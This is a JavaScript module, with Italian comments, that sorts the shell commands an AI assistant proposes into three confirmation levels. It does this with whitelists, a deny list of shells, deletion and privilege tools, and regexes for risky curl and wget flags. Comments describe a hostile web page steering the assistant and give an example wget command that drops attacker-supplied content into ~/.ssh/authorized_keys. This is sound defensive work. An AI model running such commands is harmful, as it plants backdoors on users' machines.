// Classificatore di comandi shell → livello di sicurezza (#146.6).
//
// Filo può eseguire comandi da terminale, ma il LIVELLO non lo decide mai
// l'LLM: lo calcola QUI il main process sul comando EFFETTIVO che verrà
// eseguito (vedi src/main/services/handlers.js, caso ESEGUI_COMANDO). I tre
// livelli sono quelli del registro azioni (src/shared/actionLevels.js):
//
//   1 — sola lettura, in whitelist esplicita: esegue subito senza chiedere.
//   2 — modifica lo stato in modo recuperabile (popup di conferma).
//   3 — cancellazioni, comandi pericolosi e QUALSIASI comando non riconosciuto
//       (l'utente deve digitare "conferma").
//
// Principio della spec: "dato che è impossibile assegnare un livello ad ogni
// comando, i comandi non standard hanno livello 3 di default". Quindi la
// classificazione è una whitelist: si scende a 1 o 2 SOLO per programmi (e
// sotto-comandi) esplicitamente riconosciuti come sicuri; tutto il resto è 3.
//
// Sicurezza by-design:
//   • una SEQUENZA pura di comandi separati da `&&`, `||` o `;` — e composta
//     solo da comandi a loro volta riconoscibili — prende il livello MASSIMO dei
//     suoi pezzi. Così `cd Desktop && ls` (due letture) resta livello 1 invece
//     di salire a 3 solo perché concatenato; `ls && rm -rf x` resta 3 (per via
//     dell'rm). È sicuro perché il livello non scende mai sotto quello del pezzo
//     più pericoloso.
//   • pipe (|), background (&), redirezioni (>, >>, <), sostituzioni ($(...),
//     ${...}, backtick) e newline NON sono semplici sequenze: il comando non è
//     "interamente riconoscibile" → 3, sempre. Non proviamo a fare il parsing
//     del quoting: un falso positivo qui costa solo più attrito (digitare
//     "conferma"), mai un'esecuzione silenziosa indebita.
//   • un backstop di programmi distruttivi (rm/del/format/…) resta 3 anche se
//     per errore comparisse in una whitelist.
//   • flag pericolosi (--force, --hard, -rf…) alzano un livello ≤2 a 3.
//   • curl/wget con un flag di output-su-file (-o/-O/--output/--remote-name…),
//     wget con un flag di cartella di destinazione (-P/--directory-prefix) o curl
//     con un dump degli header su file (-D/--dump-header) scrivono in un percorso
//     arbitrario e possono sovrascrivere file sensibili (chiavi SSH, script
//     d'avvio): salgono da 2 a 3. Stessa classe (scrittura in un percorso scelto
//     di DATI ACCESSORI il cui contenuto è influenzato dal server) le opzioni più
//     di nicchia di curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii,
//     --stderr e l'analoga wget --save-cookies: salgono anch'esse a 3.

(function (global) {
  'use strict';

  // Metacaratteri che rendono il comando composto/non riconoscibile → 3.
  // (`-` di `&&`/`||` è coperto da `&`/`|`.)
  const CHAIN_RE = /[|;&`<>]|\$\(|\$\{|\r|\n/;

  // Programmi che eseguono codice arbitrario o distruggono stato: SEMPRE 3,
  // controllati per primi (backstop anche se finissero in una whitelist).
  const ALWAYS_3 = new Set([
    // cancellazioni
    'rm', 'rmdir', 'rd', 'del', 'erase', 'unlink', 'deltree', 'shred',
    // catastrofici / sistema
    'format', 'mkfs', 'fdisk', 'diskpart', 'dd', 'shutdown', 'reboot',
    'restart', 'halt', 'poweroff', 'kill', 'killall', 'taskkill', 'pkill',
    'reg', 'regedit', 'sc', 'net', 'netsh', 'fsutil', 'bcdedit', 'mklink',
    'chmod', 'chown', 'chgrp', 'attrib', 'icacls', 'takeown',
    // shell ed esecutori diretti: SEMPRE 3 (anche `bash` da solo apre una
    // sessione interattiva; nessuna eccezione "versione").
    'sh', 'bash', 'zsh', 'fish', 'powershell', 'pwsh', 'cmd', 'eval', 'exec',
    'ssh', 'scp', 'sudo', 'su', 'doas',
  ]);

  // Interpreti / build tool / runner: eseguono codice arbitrario → livello 3,
  // ECCEZIONE: una pura interrogazione di versione/help (`node --version`,
  // `python -V`, `go version`, `docker --help`…) è sola lettura → livello 1.
  const ARBITRARY_CODE = new Set([
    'node', 'deno', 'bun', 'ts-node', 'tsx', 'python', 'python3', 'py', 'ruby',
    'perl', 'php', 'osascript', 'npx', 'pnpm', 'yarn', 'make', 'cmake', 'cargo',
    'go', 'rustc', 'gcc', 'g++', 'clang', 'docker', 'docker-compose', 'podman',
    'kubectl', 'helm', 'terraform', 'ansible', 'java', 'javac', 'dotnet', 'mvn',
    'gradle', 'tsc', 'dart', 'flutter', 'scala', 'kotlin', 'julia', 'lua',
    'code', 'rustup', 'rbenv', 'pyenv', 'nvm', 'composer', 'bundle', 'gem',
  ]);

  // Token che da soli rendono un comando una pura interrogazione (lettura):
  // versione o aiuto. `-v`/`-V` qui valgono "version" (vero per i tool sopra);
  // l'ambiguità `-v`=verbose non danneggia, perché un `cmd -v` senza operandi
  // non compie alcuna azione.
  const VERSION_TOKENS = new Set([
    '--version', '-version', '-v', '-V', 'version', '--help', '-help', '-h',
    'help', '/?', '/version', '--usage', '-?',
  ]);

  // Il comando è SOLO programma + token di versione/help (almeno uno: un
  // programma "nudo" come `node` apre invece un REPL e non è lettura sicura).
  function isVersionQuery(cmd) {
    const rest = tokens(cmd).slice(1);
    if (!rest.length) return false;
    return rest.every((t) => VERSION_TOKENS.has(t.toLowerCase()));
  }

  // Sola lettura, nessun effetto sullo stato: livello 1.
  const LEVEL1 = new Set([
    // `cd`/`chdir`: cambia solo la cartella di lavoro (effetto benigno e
    // pienamente reversibile, nessuna modifica su disco). È la primitiva di
    // navigazione dell'assistente: la cwd è persistente tra i suoi comandi, e
    // pretendere di digitare "conferma" a ogni spostamento la renderebbe
    // inutilizzabile. I `cd` con metacaratteri ($(...), ;, &&…) restano 3 via
    // CHAIN_RE.
    'cd', 'chdir',
    'ls', 'dir', 'pwd', 'cat', 'type', 'echo', 'whoami', 'hostname', 'date',
    'where', 'which', 'head', 'tail', 'tree', 'wc', 'ver', 'uname', 'more',
    'clear', 'cls', 'grep', 'findstr', 'stat', 'basename', 'dirname',
    'realpath', 'readlink', 'du', 'df', 'uptime', 'id', 'groups', 'whatis',
    'cal', 'nproc', 'arch',
    // diagnostica comune di sola lettura
    'ps', 'free', 'lscpu', 'lsblk', 'lsusb', 'printenv', 'whereis', 'who',
    'w', 'vmstat', 'lsof', 'column', 'cut', 'uniq', 'nl', 'file',
    'md5sum', 'sha1sum', 'sha256sum', 'cksum',
  ]);

  // Alcuni programmi LEVEL1 sono di sola lettura SOLO finché non ricevono gli
  // argomenti che ne cambiano il senso: `date` legge l'orologio ma `date -s`/
  // `--set` lo IMPOSTA, `hostname` stampa il nome ma `hostname <nome>` lo
  // CAMBIA. Senza tali argomenti restano livello 1; con essi salgono a livello 2
  // (conferma), perché modificano lo stato del sistema in modo recuperabile.
  // Ogni predicato riceve il comando intero e ritorna true se MODIFICA lo stato.
  const LEVEL1_MUTATES = {
    // `date -s "..."` / `date --set=...` imposta l'orologio; le altre forme
    // (`date`, `date +%F`, `date -u`, `date -d "ieri"`) sono letture.
    date: (cmd) => /(^|\s)(-s|--set)(=|\s|$)/i.test(cmd),
    // `hostname <nome>` (un operando non-flag) o `hostname -F file` imposta il
    // nome host; i flag di lettura (-f, -I, -i, -d, -s, -A, -a…) non cambiano
    // nulla. Nota: qui `-s` = "short" (lettura), NON "set".
    hostname: (cmd) => {
      const rest = tokens(cmd).slice(1);
      // `-F`/`--file` (imposta il nome da file) è case-sensitive: `-f` = fqdn
      // è lettura, NON deve combaciare.
      return rest.some((t) => /^(-F|--file)$/.test(t) || !t.startsWith('-'));
    },
  };

  // Modifica lo stato ma in modo recuperabile: livello 2.
  const LEVEL2 = new Set([
    'mkdir', 'md', 'touch', 'cp', 'copy', 'xcopy', 'robocopy', 'move', 'mv',
    'ren', 'rename', 'tar', 'zip', 'unzip', 'gzip', 'gunzip', 'curl', 'wget',
    'ln',
  ]);

  // Flag che alzano a 3 un comando altrimenti ≤2.
  const DANGEROUS_FLAG_RE = /(^|\s)(--force|--hard|--delete|--prune|--no-preserve-root|-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*)(\s|$)/i;

  // robocopy: i flag distruttivi Windows usano lo slash, non il trattino, quindi
  // DANGEROUS_FLAG_RE (stile Unix) NON li vede. `robocopy SRC DST /MIR` e
  // `/PURGE` CANCELLANO in modo permanente (bypassando il Cestino) i file nella
  // destinazione che non esistono nella sorgente — un `rm -rf` mirato mascherato
  // da "copia" → devono chiedere di digitare "conferma" (3), non un semplice OK
  // (2). `/MOVE` e `/MOV` spostano cancellando i file dalla SORGENTE dopo la
  // copia: se la sorgente è quella sbagliata (o pilotata da una pagina ostile) si
  // svuota una cartella non voluta → stessa classe distruttiva. Check
  // robocopy-specifico e case-insensitive (i flag Windows lo sono): applicarlo a
  // ogni comando globalmente rischierebbe falsi positivi con path Unix tipo
  // `cp /mir file` (una cartella chiamata "mir"); solo robocopy usa questi flag.
  const ROBOCOPY_DESTRUCTIVE_RE = /(^|\s)\/(MIR|PURGE|MOVE|MOV)(\s|$)/i;

  // curl/wget con un flag di OUTPUT-SU-FILE scrivono i byte scaricati in un
  // percorso scelto da chi lancia il comando (l'LLM, potenzialmente pilotato da
  // una pagina ostile): può SOVRASCRIVERE qualsiasi file — chiavi SSH
  // (~/.ssh/authorized_keys), script d'avvio della shell (~/.bashrc, ~/.profile)
  // — trasformando un "download" in una backdoor. È qualitativamente più grave
  // del semplice download (che scrive su stdout o al più nella cwd): alza a 3
  // (digita "conferma"), come i flag distruttivi di git. Coperti (anche in
  // bundle di short-flag tipo `-sLo`): -o/--output(-dir/-document),
  // -O/--remote-name(-all), -J/--remote-header-name (nome del file scelto dal
  // server). Non tentiamo di distinguere il percorso "sensibile" da quello
  // innocuo: è inaffidabile (path relativi, ~, symlink, differenze OS) e un
  // falso negativo qui = il buco di sicurezza; l'over-cautela costa solo attrito.
  // Check curl/wget-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
  // significherebbe altro. In un bundle di short-flag l'unico modo di avere una
  // `o`/`O` è che sia il flag di output (curl -o/-O, wget -o=logfile/-O): gli
  // altri short-flag di curl/wget non contengono `o`, quindi `-[a-z]*o` non ha
  // falsi positivi qui. `-J`/--remote-header-name senza -O è inerte, e con -O è
  // già coperto da -O: non serve intercettare la `j` (che confliggerebbe con
  // curl -j = --junk-session-cookies, innocuo).
  const CURL_WGET_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;

  // wget con `-P`/`--directory-prefix` sceglie la CARTELLA di destinazione e il
  // nome del file arriva dall'URL (quindi dal server): `wget -P ~/.ssh http://
  // evil/authorized_keys` scarica contenuto interamente scelto dall'attaccante
  // dritto in ~/.ssh/authorized_keys. È la stessa backdoor di `-O`, solo scritta
  // scegliendo la dir invece del file → deve salire a 3. Check wget-specifico:
  // `-P` (uppercase) è, in wget, SOLO `--directory-prefix` (nessun altro
  // short-flag wget usa la P maiuscola), quindi anche dentro un bundle
  // (`-rP /dir`, `-P/dir` attaccato) l'unica lettura possibile è quella. La `P`
  // è case-SENSITIVE apposta: `-p` = `--page-requisites` (scrive nella cwd, non
  // arbitrario) e `-np` = `--no-parent` NON devono salire. `--directory-prefix`
  // (doppio trattino) è gestito a parte: il ramo short a trattino singolo non lo
  // intercetta.
  const WGET_PREFIX_RE = /(^|\s)(--directory-prefix(=|\s|$)|-[a-zA-Z]*P)/;

  // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
  // percorso arbitrario: il contenuto lo decide il server (quindi l'attaccante
  // che pilota l'assistente da una pagina ostile), rendendolo un altro primitivo
  // di scrittura-su-file arbitraria → 3. Meno potente di `-o`/`-O` (byte header,
  // non corpo scelto liberamente) ma stessa classe: over-cautela = solo attrito.
  // Check curl-specifico e case-SENSITIVE sulla `D`: `-d`/`--data` (corpo POST)
  // è innocuo e NON deve salire; solo la `D` maiuscola (in curl = solo
  // `--dump-header`) alza, anche in bundle (`-sD file`).
  const CURL_DUMP_RE = /(^|\s)(--dump-header|-[a-zA-Z]*D)/;

  // curl con flag che SALVANO DATI ACCESSORI in un percorso scelto da chi lancia
  // il comando, con un contenuto comunque INFLUENZATO dal server (quindi da una
  // pagina ostile che pilota l'assistente): -c/--cookie-jar (i cookie del sito),
  // --etag-save (l'ETag della risposta), --trace/--trace-ascii (la traccia di
  // debug della richiesta/risposta), --stderr (log/diagnostica di curl). Sono la
  // stessa classe logica di -D/--dump-header — scrittura-su-file arbitraria di
  // roba decisa dal remoto — solo più di nicchia e col contenuto più vincolato
  // (formato cookie netscape, ETag quotato, dump esadecimale): l'iniezione è meno
  // pulita ma il primitivo di scrittura resta, quindi salgono a 3 (digita
  // "conferma") per simmetria col resto dei download. Check curl-specifico e
  // case-SENSITIVE sulla `c`: `-c` (minuscolo, in curl SOLO --cookie-jar, scrive)
  // alza anche in bundle (`-sc`, `-cs`); `-C`/--continue-at (MAIUSCOLO, riprende
  // un download normale) NON deve salire. I long-flag di sola lettura simili
  // (--cookie/-b legge i cookie, --etag-compare li confronta, --cacert/--cert
  // leggono un certificato, --trace-time/--trace-ids sono modificatori senza
  // file) NON combaciano: la parte long è ancorata con `(=|\s|$)` e il ramo short
  // matcha solo la `c` minuscola in un bundle a trattino singolo.
  const CURL_ACCESSORY_WRITE_RE = /(^|\s)(--cookie-jar|--etag-save|--trace(-ascii)?|--stderr)(=|\s|$)|(^|\s)-[a-zA-Z]*c/;

  // wget con `--save-cookies <file>` scrive i cookie del sito (contenuto
  // influenzato dal server) in un percorso arbitrario: stessa classe di
  // curl --cookie-jar → 3. `--load-cookies` (LEGGE i cookie) è innocuo e, essendo
  // esplicito il nome, NON combacia.
  const WGET_SAVE_COOKIES_RE = /(^|\s)--save-cookies(=|\s|$)/;

  // git: il livello dipende dal sotto-comando. I sotto-comandi "duali"
  // (tag, branch, config, remote) NON stanno qui: leggono da soli ma scrivono
  // con un operando, quindi li classifica GIT_DUAL guardando gli argomenti.
  const GIT_READ = new Set([
    'status', 'log', 'diff', 'show',
    'rev-parse', 'describe', 'blame', 'ls-files', 'ls-tree', 'shortlog',
    'reflog', 'whatchanged', 'cat-file', 'name-rev', 'symbolic-ref',
    'version', 'help', 'grep', 'count-objects',
  ]);
  const GIT_WRITE = new Set([
    'add', 'commit', 'push', 'pull', 'fetch', 'switch', 'merge',
    'rebase', 'cherry-pick', 'revert', 'init', 'clone', 'mv',
    'apply', 'am', 'pop', 'worktree', 'submodule',
  ]);
  // NB: 'checkout' e 'stash' NON stanno in GIT_WRITE: hanno forme DISTRUTTIVE che
  // scartano lavoro non salvato (`git checkout .`/`-- <path>`, `git stash drop`/
  // `clear`) e forme innocue (cambio ramo, salvataggio di uno stash). Il livello
  // dipende dagli argomenti → li classifica GIT_DUAL qui sotto.
  // I distruttivi di git (reset --hard, clean, branch -D, push --force…)
  // li intercetta DANGEROUS_FLAG_RE o il fatto che siano fuori dalle due liste.
  const GIT_DESTROY = new Set(['reset', 'clean', 'rm', 'gc', 'filter-branch', 'update-ref', 'prune']);

  // npm/pip: il livello dipende dal sotto-comando.
  const NPM_READ = new Set(['list', 'ls', 'view', 'show', 'outdated', 'root', 'bin', 'prefix', 'ping', 'doctor', 'whoami', 'help', 'search', 'config']);
  const NPM_WRITE = new Set(['install', 'i', 'ci', 'add', 'update', 'upgrade', 'uninstall', 'remove', 'rm', 'dedupe', 'prune', 'link', 'rebuild']);
  // npm run / exec / start / test / publish → eseguono script arbitrari o
  // pubblicano (irreversibile) → restano fuori → 3.

  function tokens(cmd) {
    // Spezza grezzamente su spazi; sufficiente per leggere programma e flag,
    // dato che i comandi con quoting "interessante" finiscono comunque a 3.
    return String(cmd).trim().split(/\s+/).filter(Boolean);
  }

  function programOf(cmd) {
    const first = tokens(cmd)[0] || '';
    // togli quoting, prendi il basename, normalizza, togli estensioni eseguibili
    const bare = first.replace(/^['"]|['"]$/g, '');
    return bare.split(/[\\/]/).pop().toLowerCase().replace(/\.(exe|cmd|bat|ps1|com|msi)$/i, '');
  }

  // sotto-comando = primo token che non è una flag (dopo il programma)
  function subcommandOf(cmd) {
    const t = tokens(cmd).slice(1);
    for (const x of t) {
      if (!x.startsWith('-')) return x.replace(/^['"]|['"]$/g, '').toLowerCase();
    }
    return '';
  }

  // In git i flag distruttivi sono più ricchi: oltre a --force/--hard, anche
  // -f (force su push/checkout/add), -d/-D (delete branch/tag, clean -d) e
  // --delete/--prune. Un check git-specifico (più aggressivo del globale, che
  // su comandi come `tar -f` significherebbe altro) → alza a 3.
  // `--discard-changes` (checkout/switch) BUTTA VIA le modifiche non salvate del
  // working tree tanto quanto `reset --hard`: qui perché è un flag che esiste solo
  // per checkout/switch, entrambi distruttivi quando lo usano → sempre 3.
  const GIT_DANGER_RE = /(^|\s)(--force(-with-lease)?|--hard|--delete|--prune|--discard-changes|-f|-d|-D|-[a-z]*f[a-z]*d[a-z]*|-[a-z]*d[a-z]*f[a-z]*)(\s|$)/i;

  // Argomenti che seguono il sotto-comando git (esclusi programma e
  // sotto-comando stesso). `git tag v1.0` → ['v1.0']; `git branch` → [];
  // `git config --get user.name` → ['--get', 'user.name'].
  function gitArgsAfterSub(cmd) {
    const t = tokens(cmd).slice(1); // via il programma `git`
    const i = t.findIndex((x) => !x.startsWith('-')); // posizione del sotto-comando
    return i < 0 ? [] : t.slice(i + 1);
  }
  const hasOperand = (args) => args.some((a) => !a.startsWith('-'));

  // Sotto-comandi il cui LIVELLO dipende dagli argomenti. Due famiglie:
  //  • "duali" lettura/scrittura: ELENCANO (livello 1) se nudi o con soli flag,
  //    CREANO/IMPOSTANO (livello 2) con un operando. `git tag` elenca / `git tag
  //    v1.0` crea; `git branch` elenca / `git branch nuovo` crea; `git config
  //    --list` legge / `git config user.name "X"` scrive; `git remote -v` elenca
  //    / `git remote add` aggiunge.
  //  • "sicuro vs distruttivo": `checkout` e `stash` hanno forme innocue
  //    (cambio/creazione ramo, salvataggio di uno stash → livello 2) e forme che
  //    SCARTANO LAVORO NON SALVATO in modo irreversibile (livello 3, digita
  //    "conferma"), come i loro gemelli `restore`/`reset --hard`/`clean`.
  // Le forme distruttive a flag (branch -D, tag -d, config --unset, remote
  // remove/prune, checkout -f/--discard-changes) sono già intercettate prima da
  // GIT_DANGER_RE; il resto lo discrimina il predicato qui.
  const GIT_DUAL = {
    tag: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
    branch: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
    // `git checkout` è DISTRUTTIVO quando prende di mira un pathspec: `git
    // checkout .` (scarta TUTTE le modifiche), `git checkout -- <path>`, `git
    // checkout <ref> -- <path>`, `git checkout <ref> <path>` (ripristina il file
    // dal ref, buttando via le modifiche locali) → livello 3. Resta livello 2 il
    // checkout NON distruttivo: cambio ramo (`git checkout main`), creazione
    // (`git checkout -b nuovo [start]`, `-B`), torna-al-precedente (`git checkout
    // -`). La discriminante è la presenza di un pathspec; `-b`/`-B` (e le sue
    // varianti) sono creazione di ramo, MAI scarto di path, anche con 2 operandi.
    checkout: (cmd) => {
      const args = gitArgsAfterSub(cmd);
      // `--` separa esplicitamente i pathspec: tutto ciò che segue è un file da
      // ripristinare (scarto del working tree).
      if (args.includes('--')) return 3;
      // `-b`/`-B`/`--orphan`/`--detach`: crea/sposta un ramo, non tocca i path.
      if (args.some((a) => /^(-b|-B|--orphan|--detach)$/.test(a))) return 2;
      const ops = args.filter((a) => !a.startsWith('-'));
      if (ops.includes('.')) return 3;         // scarta tutte le modifiche
      if (ops.length >= 2) return 3;           // `<ref> <path>` senza `--`
      return 2;                                // cambio ramo (0-1 operando)
    },
    // `git stash` SALVA le modifiche (recuperabile con pop → livello 2), ma
    // `git stash drop`/`clear` ELIMINANO stash salvati in modo irreversibile →
    // livello 3. Gli altri sotto-verbi (push/save/pop/apply/list/show) restano 2.
    stash: (cmd) => {
      const verb = (gitArgsAfterSub(cmd).filter((a) => !a.startsWith('-'))[0] || '').toLowerCase();
      return verb === 'drop' || verb === 'clear' ? 3 : 2;
    },
    config: (cmd) => {
      const args = gitArgsAfterSub(cmd);
      const low = args.map((a) => a.toLowerCase());
      if (low.some((a) => a === '--unset' || a === '--unset-all' || a === '--remove-section')) return 3;
      if (low.some((a) => a === '--add' || a === '--replace-all' || a === '--rename-section' || a === '-e' || a === '--edit')) return 2;
      // `chiave valore` (≥2 operandi) imposta; `--list`/`--get`/`chiave` (≤1) legge.
      return args.filter((a) => !a.startsWith('-')).length >= 2 ? 2 : 1;
    },
    remote: (cmd) => {
      const ops = gitArgsAfterSub(cmd).filter((a) => !a.startsWith('-'));
      if (!ops.length) return 1; // `git remote`, `git remote -v`
      const action = ops[0].toLowerCase();
      if (action === 'show' || action === 'get-url') return 1;
      if (action === 'remove' || action === 'rm' || action === 'prune') return 3; // cancellazioni
      return 2; // add, rename, set-url, set-head, set-branches, update…
    },
  };

  function classifyGit(cmd) {
    const sub = subcommandOf(cmd);
    if (!sub) return 1; // `git` da solo stampa l'help → lettura
    if (GIT_DESTROY.has(sub)) return 3;
    if (GIT_DANGER_RE.test(cmd)) return 3; // es. push --force, checkout -f, branch -D, tag -d
    const dual = GIT_DUAL[sub];
    if (dual) return dual(cmd); // tag/branch/config/remote: dipende dagli argomenti
    if (GIT_READ.has(sub)) return 1;
    if (GIT_WRITE.has(sub)) return 2;
    return 3; // sotto-comando git sconosciuto → cautela
  }

  function classifyNpm(cmd) {
    const sub = subcommandOf(cmd);
    if (!sub) return 1; // `npm` da solo → help
    if (NPM_READ.has(sub)) return 1;
    if (NPM_WRITE.has(sub)) return 2;
    return 3; // run/exec/start/test/publish/sconosciuti → 3
  }

  // Se il comando è una pura sequenza di comandi separati da `&&`, `||` o `;`
  // (senza pipe, background, redirezioni o sostituzioni), ritorna l'elenco dei
  // singoli comandi; altrimenti null. Le sequenze "sicure" si classificano poi
  // pezzo per pezzo prendendo il massimo: concatenare due letture (cd && ls)
  // non deve trasformarle in un'azione irreversibile.
  function splitSafeSequence(cmd) {
    // Metacaratteri che NON sono semplice sequenziamento: redirezioni,
    // sostituzioni, backtick, newline → non è una sequenza sicura.
    if (/[`<>]|\$\(|\$\{|\r|\n/.test(cmd)) return null;
    const parts = cmd.split(/\s*(?:&&|\|\||;)\s*/).filter(Boolean);
    // Dopo aver tolto `&&`/`||`/`;`, un `&` o `|` "solitario" residuo significa
    // background o pipe → non è una sequenza sicura.
    for (const p of parts) {
      if (/[&|]/.test(p)) return null;
    }
    return parts;
  }

  // Livello di un SINGOLO comando (senza metacaratteri di sequenza).
  function classifyOne(trimmed) {
    const prog = programOf(trimmed);
    if (!prog) return 3;
    if (ALWAYS_3.has(prog)) return 3;

    if (prog === 'git') return classifyGit(trimmed);
    if (prog === 'npm' || prog === 'pip' || prog === 'pip3') return classifyNpm(trimmed);

    // Interpreti / build tool: codice arbitrario → 3, ma la sola interrogazione
    // di versione/help è lettura → 1 (es. `node --version`, `go version`).
    if (ARBITRARY_CODE.has(prog)) return isVersionQuery(trimmed) ? 1 : 3;

    if (LEVEL1.has(prog)) {
      // Quasi tutti i LEVEL1 restano 1 anche con flag (la lettura non diventa
      // distruttiva). Eccezione: i pochi comandi che con certi argomenti
      // IMPOSTANO lo stato (date -s, hostname <nome>) salgono a 2 (conferma).
      const mutates = LEVEL1_MUTATES[prog];
      return mutates && mutates(trimmed) ? 2 : 1;
    }
    // Anche un comando LEVEL2 ridotto a `--version`/`--help` è sola lettura → 1.
    if (LEVEL2.has(prog)) {
      if (isVersionQuery(trimmed)) return 1;
      // curl/wget che scrivono un file di output a un percorso arbitrario possono
      // sovrascrivere qualsiasi file (chiavi SSH, script d'avvio) → 3.
      if ((prog === 'curl' || prog === 'wget') && CURL_WGET_OUTPUT_RE.test(trimmed)) return 3;
      // wget -P/--directory-prefix: sceglie la dir, il nome file arriva dall'URL
      // (server) → stessa scrittura arbitraria di -O → 3.
      if (prog === 'wget' && WGET_PREFIX_RE.test(trimmed)) return 3;
      // curl -D/--dump-header: scrive gli header (contenuto del server) in un
      // percorso arbitrario → 3.
      if (prog === 'curl' && CURL_DUMP_RE.test(trimmed)) return 3;
      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr:
      // salvano dati accessori influenzati dal server in un percorso scelto → 3.
      if (prog === 'curl' && CURL_ACCESSORY_WRITE_RE.test(trimmed)) return 3;
      // wget --save-cookies: scrive i cookie del sito in un percorso scelto → 3.
      if (prog === 'wget' && WGET_SAVE_COOKIES_RE.test(trimmed)) return 3;
      // robocopy /MIR /PURGE (cancellano la destinazione) / /MOVE /MOV
      // (cancellano la sorgente): distruzione permanente → 3.
      if (prog === 'robocopy' && ROBOCOPY_DESTRUCTIVE_RE.test(trimmed)) return 3;
      return DANGEROUS_FLAG_RE.test(trimmed) ? 3 : 2;
    }

    return 3; // comando non riconosciuto → livello 3 di default
  }

  // Livello di sicurezza del comando: 1 | 2 | 3. Mai null: l'ignoto è 3.
  function classify(cmd) {
    if (typeof cmd !== 'string') return 3;
    const trimmed = cmd.trim();
    if (!trimmed) return 3;

    // Sequenza pura di comandi (`&&`/`||`/`;`) → livello = massimo dei pezzi.
    const seq = splitSafeSequence(trimmed);
    if (seq && seq.length > 1) {
      return seq.reduce((max, part) => Math.max(max, classifyOne(part)), 1);
    }
    // Pipe / background / redirezioni / sostituzioni: non riconoscibili → 3.
    if (!seq && CHAIN_RE.test(trimmed)) return 3;

    return classifyOne(trimmed);
  }

  global.SN_CMD_CLASSIFY = { classify, programOf, subcommandOf };
})(typeof globalThis !== 'undefined' ? globalThis : self);
